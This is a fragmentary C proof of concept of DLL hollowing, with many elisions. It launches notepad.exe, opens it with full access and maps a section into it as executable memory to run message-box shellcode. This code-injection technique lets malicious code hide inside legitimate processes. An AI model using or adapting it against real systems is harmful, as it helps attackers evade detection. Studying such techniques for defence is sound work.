								...
								if (!bTxF || bTxF_Valid) {
									...
									if (NT_SUCCESS(ntStatus)) {
										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										...
										ntRemoteStatus = pNtMapViewOfSection(hSection, hProcessHandle, (void**)ppRemoteMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_EXECUTE_READ);

										if (NT_SUCCESS(ntStatus) || NT_SUCCESS(ntRemoteStatus)) {
...
INT main() {
	...
	if (CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
		...
		if ((hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) != INVALID_HANDLE_VALUE) {
			...
			// Hollow!
			if (HollowDll(&pMapBuf, &pRemoteMapBuf, &qwMapBufSize, bMessageboxShellcode64, sizeof bMessageboxShellcode64,
				&pMappedCode, &pMappedRemoteCode, bTxF, bIsElevated, hProcessHandle)) {
	...
	if (hTargetThreadHandle) {
		CloseHandle(hTargetThreadHandle);
	}
}
